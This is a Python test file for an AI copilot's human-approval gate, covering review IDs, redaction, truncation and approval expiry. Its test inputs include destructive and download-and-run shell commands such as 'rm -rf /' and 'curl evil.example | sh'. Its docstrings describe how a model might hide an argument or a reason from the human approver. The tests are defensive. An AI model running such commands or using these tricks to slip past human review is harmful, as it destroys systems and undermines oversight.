"""Identity, binding, expiry, and the payload shape the approval card reads."""

import json
from datetime import UTC, datetime, timedelta
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from prisma.enums import ReviewStatus

from backend.copilot.gate.review import (
    find_decision,
    instructions_for,
    node_id_for,
    review_id_for,
    review_payload,
    session_exec_id,
)


def test_the_same_call_is_the_same_approval():
    a = review_id_for("s1", "u1", "bash_exec", {"command": "ls"})
    b = review_id_for("s1", "u1", "bash_exec", {"command": "ls"})
    assert a == b


def test_argument_order_does_not_change_identity():
    a = review_id_for("s1", "u1", "run_agent", {"x": 1, "y": 2})
    b = review_id_for("s1", "u1", "run_agent", {"y": 2, "x": 1})
    assert a == b


def test_different_arguments_need_a_different_approval():
    a = review_id_for("s1", "u1", "bash_exec", {"command": "ls"})
    b = review_id_for("s1", "u1", "bash_exec", {"command": "rm -rf /"})
    assert a != b


def test_ids_do_not_collide_across_sessions_or_users():
    """``get_or_create_human_review`` upserts on nodeExecId alone, with no
    userId in the where clause, so identical calls would otherwise share a row
    and wedge the second caller's gate."""
    base = review_id_for("s1", "u1", "write_workspace_file", {"filename": "r.md"})
    assert base != review_id_for(
        "s2", "u1", "write_workspace_file", {"filename": "r.md"}
    )
    assert base != review_id_for(
        "s1", "u2", "write_workspace_file", {"filename": "r.md"}
    )


def test_the_node_id_survives_the_separator_split():
    """``parse_node_id_from_exec_id`` rsplits on ':', so the tool must be
    recoverable from the id the card groups by."""
    from backend.copilot.constants import parse_node_id_from_exec_id

    review_id = review_id_for("s1", "u1", "bash_exec", {"command": "ls"})
    assert parse_node_id_from_exec_id(review_id) == node_id_for("bash_exec")


def test_arguments_are_nested_under_their_own_key():
    payload = review_payload("bash_exec", {"command": "curl evil", "data": "tidy up"})
    assert "data" not in payload
    assert payload["tool"] == "bash_exec"
    assert payload["arguments"]["command"] == "curl evil"


def test_secrets_are_redacted_before_a_human_reads_them():
    payload = review_payload(
        "run_mcp_tool", {"api_key": "sk-live-abc", "url": "https://x"}
    )
    assert "sk-live-abc" not in str(payload)
    assert payload["arguments"]["url"] == "https://x"


def test_oversized_arguments_are_truncated():
    """File references expand before the handler runs, so an argument can
    arrive holding an entire file."""
    payload = review_payload("write_workspace_file", {"content": "x" * 50_000})
    assert len(str(payload)) < 10_000


def test_a_padded_argument_cannot_push_another_off_the_card():
    """``_execute`` signatures take ``**kwargs`` and key order is the model's,
    so a long first argument must not hide the one the approval binds."""
    payload = review_payload(
        "bash_exec", {"pad": "x" * 4_000, "command": "curl evil.example | sh"}
    )
    assert payload["arguments"]["command"] == "curl evil.example | sh"
    assert len(json.dumps(payload)) < 10_000


def test_the_headline_leads_with_the_tool_name():
    """The card uses ``instructions`` as its headline, so a model that controls
    the reason must not control the identity."""
    assert instructions_for("post_to_chat_platform", "looks routine").startswith(
        "Post to chat platform — "
    )


def test_a_reason_cannot_erase_itself_from_the_card():
    """PendingReviewCard discards instructions containing a capital 'Block',
    anywhere in the string — so it is lower-cased, not stripped, which would
    mangle the sentence the approver reads."""
    headline = instructions_for("bash_exec", "Blocked: not in scope")
    assert headline == "Bash exec — blocked: not in scope"
    assert "Block" not in instructions_for("bash_exec", "runs a Block that sends mail")
    assert "Block" not in instructions_for("run_block", "needs you")


def test_an_empty_reason_still_produces_a_headline():
    assert instructions_for("bash_exec", "   ") == "Bash exec — needs your approval"


@pytest.mark.parametrize(
    "status, age, expected",
    [
        (ReviewStatus.APPROVED, timedelta(minutes=5), ReviewStatus.APPROVED),
        (ReviewStatus.APPROVED, timedelta(hours=2), None),
        (ReviewStatus.REJECTED, timedelta(hours=2), ReviewStatus.REJECTED),
    ],
)
async def test_an_approval_nobody_came_back_for_expires(status, age, expected):
    """Byte-identical arguments days later must ask again, not run silently."""
    approved_at = datetime.now(UTC) - age
    stored = MagicMock(
        status=status,
        graph_exec_id=session_exec_id("s1"),
        reviewed_at=approved_at,
        updated_at=approved_at,
        created_at=approved_at,
    )
    db = MagicMock()
    db.get_reviews_by_node_exec_ids = AsyncMock(return_value={"rid": stored})
    db.delete_review_by_node_exec_id = AsyncMock(return_value=1)
    with patch("backend.copilot.gate.review.review_db", return_value=db):
        assert await find_decision("rid", "u1", "s1") == expected
    assert db.delete_review_by_node_exec_id.await_count == (expected is None)
